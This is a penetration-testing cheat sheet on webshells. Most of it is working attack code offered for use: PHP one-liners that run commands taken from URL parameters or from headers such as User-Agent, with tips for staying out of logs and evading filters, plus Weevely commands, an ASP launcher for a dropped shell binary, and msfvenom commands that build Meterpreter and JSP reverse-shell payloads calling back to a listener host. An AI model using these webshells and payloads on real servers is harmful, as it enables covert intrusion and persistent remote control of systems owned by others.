# Webshell

A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 \(and 443\). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic.

You have access to different kinds of webshells on Kali here:

```
/usr/share/webshells
```

## PHP

This code can be injected into pages that use php.

```php
# Execute one command
<?php system("whoami"); ?>

# Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>

# The same but using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?>

# Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

# Instead to this if you can. It will return the output as an array, and then print it all.
<?php exec("ls -la",$array); print_r($array); ?>

# preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

# Using backticks
<?php echo `whoami`; ?>
```

You can then call then execute the commands like this:

```
http://192.168.1.103/index.php?cmd=pwd
```

### Make it stealthy

We can make the commands from above a bit more stealthy. Instead of passing the cmd through the url, which will be obvious in logs, we can pass them through other header-parameters. We can use a tool like Burp Suite or even just netcat or curl to insert these commands.

```php
<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
<?php system($_SERVER['HTTP_USER_AGENT'])?>

# I have had to use this one
<?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
```

### Obfuscation

The following functions can be used to obfuscate the code.  It's unlikely to fool a SOC analyst, but it's useful bypassing character filtering methods.

```
eval()
assert()
base64()
gzdeflate()
str_rot13()
```

### Weevely

Using weevely we can create php webshells:

```
weevely generate password /root/webshell.php
```

Not we execute it and get a shell in return:

```
weevely "http://192.168.1.101/webshell.php" password
```

## ASP

```
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
%>
```

## Coldfusion

There's the standard CFM webshell included with Kali, but it doesn't have that many features and can be a slight pain to get working.  If you're going for stealth, it's easier to modify but I'd recommend the CFM v3 Webshell:

[https://github.com/Reboare/Cfm\_Shell\_v3.0\_edition](https://github.com/Reboare/Cfm_Shell_v3.0_edition)

This one allows easy directory traversal which the standard Kali one lacks.

## MSFVenom - Platform Independent

### PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```

### ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
```

### WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```

### JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```

## References

[http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/](http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/)  
[http://www.binarytides.com/web-shells-tutorial/](http://www.binarytides.com/web-shells-tutorial/)

